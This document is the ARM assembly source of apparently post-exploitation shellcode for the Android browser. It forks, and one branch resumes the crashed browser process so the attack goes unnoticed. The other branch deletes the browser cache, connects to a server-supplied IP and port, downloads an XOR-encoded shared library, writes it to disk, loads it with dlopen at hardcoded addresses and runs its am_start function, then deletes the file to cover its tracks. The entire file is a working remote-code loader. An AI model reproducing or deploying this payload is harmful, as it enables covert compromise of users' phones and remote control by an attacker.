.globl _start

.section .text	

_start:
	.code 32
	/* precondition: */
	/* r3 : base + 0x0 */
	mov r11, r3  // store base + 0x0 in r10 for continuation
	
	// This commented out makes the browser crash, however it lets me follow the "child" process
	mov	r7, #2
	svc	0
	cmp	r0, #0
	bne	coe
	
chdir:	
	// chdir to /data/data/com.google.android.browser
	adr	r0, app_cache
	mov	r7, #12
	svc	0

	cmp	r0, #0
	bne	exit  // If chdir failed exit
	
emptycache:
	// fork
	mov	r7, #2
	svc	0
	cmp	r0, #0
	
	bne	socket
	
	/* execve(/system/bin/rm, [/system/bin/rm, -R, cache, 0], 0) */
	adr	r0, rm
	adr	r2, cache_relative
	adr	r1, recursive
	sub	r3, r3, r3
	push	{r0, r1, r2, r3}
	sub	r2, r2, r2
	mov	r1, sp
	mov	r7, #11
	svc	0
	

socket:	
	/* socket(2, 1, 0) */
	mov     r0, #2
	mov     r1, #1
	sub     r2, r2, r2
	lsl     r7, r1, #8
	add     r7, r7, #25
	svc     0

connect:
	mov     r6, r0	          /* r6 contains socket descriptor */
	adr     r1, sockaddr_dl   /* r1 points to sockaddr */
	mov     r2, #16
	add     r7, #2	          /* socket + 2 = 283 */
	svc     0	          /* connect(r0, &addr, 16) */

open:
	adr	r2, open_mode
	ldrh	r2, [r2]
	adr	r1, open_flags
	ldrh	r1, [r1]
	adr	r0, module_relative
	mov	r7, #5
	svc	0	        /* open(filename,O_RDWR|O_CREAT|O_TRUNC[0001.0100.1000=1101],700) */
	mov	r8, r0		/* r8 holds file descriptor */


	/* 5] read-write loop  */

	mov	r9, r6		/* from now on sockfd is r9 */
	mov	r6, #0		/* r6 now contains bytes written so far */

read:
	adr	r2, buffer_size	/* size per read */
	ldrh	r2, [r2]
	adr	r5, buffer      /* r5 is ptr to buffer */
	mov	r1, r5
	mov	r0, r9          /* sockfd */
	mov	r7, #3
	svc	0		/* read(int fd, void *buf, size_t count) */

	cmp 	r0, #1		/* 0 eof, negative error, we write only if we've read something  */
	blt	close

	mov	r12, r0		/* r12 holds the number of bytes read */


setup:	adr	r1, key
	ldr	r1, [r1]	/* r1 holds the key */
	mov	r2, r5		/* r2 is ptr to buffer */

	mov	r3, #0		/* r3 holds number of bytes xored */

xor:
	ldr	r0, [r2]
	eor	r0, r0, r1
	str	r0, [r2]

	add 	r3, r3, #4
	add	r2, r2, #4
	cmp	r3, r12
	blt	xor


write:
	mov	r2, r12		/* write only the number of bytes read */
	mov	r1, r5
	mov	r0, r8
	mov	r7, #4	        /* write(int fd, const void *buf, size_t count) */
	svc	0

	add	r6, r0		/* update the number of bytes written so far */
	b	read

close:
	/* close socketfd and filefd */ 
	mov	r0, r8
	mov	r7, #6
	svc	0

	mov	r0, r9
	mov	r7, #6
	svc	0

dlopen:
	adr	r3, dlopen_addr
	ldr	r3, [r3]
	adr	r0, module_absolute
	mov	r1, #0
	blx	r3
	cmp	r0, #0
	beq	cleanup
	
dlsym:
	mov	r8, r0
	adr 	r3, dlsym_addr
	ldr	r3, [r3]
	adr	r1, start
	blx	r3
	mov	r3, r0
	
launch:	
	adr	r0, ip
	ldr	r0, [r0]
	adr	r1, port
	ldrh	r1, [r1]
	blx	r3

dlclose:
	adr 	r3, dlclose_addr
	ldr	r3, [r3]
	mov	r0, r8
	blx	r3
	
	// fall down to cleanup after dlclose
	
cleanup:
	/* execve(/system/bin/rm, [/system/bin/rm, -R, module, 0], 0) */
	adr	r0, rm
	adr	r2, module_absolute
	adr	r1, recursive
	sub	r3, r3, r3
	push	{r0, r1, r2, r3}
	sub	r2, r2, r2
	mov	r1, sp
	mov	r7, #11
	svc	0
	
	// fall down to exit after cleanup

exit:   // exit(0)
	mov	r0, #0
	mov 	r7, #1
	svc	0
coe:
	/* Continuation of execution */
	/* precondition: */
	/* r11 : base + 0x0 (e.g. 0x6a000000) */
	ldr r4, [r11, #0x8]   	// r4 <- arena address
	ldr r1, [r4, #0x14]	// r1 <- sp + 0x98 (at time of call)
	sub sp, r1, #0x70       // crashcaller stack frame
	pop {r6,r7,r8,r9,r10}
	mov r0, r7
	sub r5, r7, #0x20
	mov r1, #0
	pop {pc}

	
	        .align 2
app_cache:	.asciz "/data/data/com.google.android.browser"
	        .align 2
module_absolute:.asciz "/data/data/com.google.android.browser/loadmodules.so" // Can be changed
	        .align 2
module_relative:.asciz "loadmodules.so" // Can be changed
	        .align 2
rm:		.asciz "/system/bin/rm"
	        .align 2
cache_relative:	.asciz "cache"
	        .align 2
recursive:	.asciz "-R"
	        .align 2
open_mode:	.short 0x1c0 // 700
	        .align 2
open_flags:	.short 0x242 // O_RDWR|O_CREAT|O_TRUNC
	        .align 2
dlopen_addr:	.word 0xb000585c + 1
	        .align 2
dlsym_addr:	.word 0xb00057c8 + 1
	        .align 2
dlclose_addr:	.word 0xb0005708 + 1
	        .align 2
start:		.asciz "am_start"
	
/*
struct sockaddr_in {
    short            sin_family      // e.g. AF_INET, AF_INET6
    unsigned short   sin_port	     // e.g. htons(3490)
    struct in_addr   sin_addr	     // see struct in_addr, below
    char             sin_zero[8]     // zero this if you want to
}
*/
	        .align 2
key:		.word 0x0d0d0d0d           // xor key [TO BE CHANGED BY SERVER]
	        .align 2
sockaddr_dl:
		.short 0x2
		.byte 0x0c,0x0c            // htons(2223) [TO BE CHANGED BY SERVER]
ip:		.byte 0x0b,0x0b,0x0b,0x0b  // IP [TO BE CHANGED BY SERVER]
	        .align 2
port:		.short 0x0a0a              // port [TO BE CHANGED BY SERVER]
	
	        .align 2
buffer_size:  
	        .short 0x400
	        .align 2
buffer:		.byte 3,3,3,3
